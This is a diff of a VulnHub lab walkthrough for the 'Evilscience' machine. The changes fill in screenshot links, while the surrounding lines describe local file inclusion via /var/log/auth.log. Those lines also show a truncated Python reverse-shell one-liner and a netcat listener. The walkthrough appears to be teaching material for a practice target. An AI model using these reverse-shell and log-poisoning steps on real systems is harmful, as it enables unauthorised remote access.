@@ -36,7 +36,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Testing for Local File Inclusion 
 We found that we can access /var/log/auth.log
 
-![Alt Tag]()
+![Alt Tag](https://raw.githubusercontent.com/setrus/VulnHub/master/Evilscience/evil1.png)
 
 
 To exploit we leverage the auth log
@@ -56,7 +56,7 @@ Permission denied, please try again.
 
 
 Reverse shell - Remote Command Execution
-![Alt Tag]()
+![Alt Tag](https://raw.githubusercontent.com/setrus/VulnHub/master/Evilscience/evil2.png)
 
 
 Getting a reverse shell using python:
@@ -67,7 +67,7 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 
 This is URL encoded and send to the server:
 
-![Alt Tag]()
+![Alt Tag](https://raw.githubusercontent.com/setrus/VulnHub/master/Evilscience/evil3.png)
 
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 root@setrus:~# nc -nvlp 1234
